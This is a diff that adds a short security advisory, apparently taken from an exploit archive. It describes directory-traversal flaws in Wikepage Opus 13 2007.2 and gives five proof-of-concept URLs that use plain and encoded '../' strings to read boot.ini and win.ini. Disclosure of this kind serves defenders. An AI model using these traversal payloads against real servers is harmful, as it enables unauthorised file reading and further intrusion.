@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/28664/info
+
+Wikepage Opus is prone to multiple directory-traversal vulnerabilities because the application fails to sufficiently sanitize user-supplied input.
+
+An attacker can exploit these issues using directory-traversal strings ('../') to download arbitrary files with the privileges of the webserver process. Information obtained may aid in further attacks.
+
+Wikepage Opus 13 2007.2 is affected; other versions may also be vulnerable.
+
+http://www.example.com/wikepage/index.php?wiki=template=../../../../../../../../boot.ini  
+http://www.example.com/wikepage/index.php?wiki=Admin=../../../../../../../../boot.ini
+http://www.example.com/wikepage/index.php?wiki=Recent_changes=../../../../../../../../boot.ini
+http://www.example.com/wikepage/index.php?wiki=Recent_changes=# %2e%2e%5c# %2e%2e%5c# %2e%2e%5c# %2e%2e%5c# %2e%2e%5c# %2e%2e%5c# %2e%2e%5c# %2e%2e%5c/boot.ini
+http://www.example.com/wikepage/index.php?wiki=Recent_changes=..\..\..\..\..\..\..\..\WINDOWS\win.ini
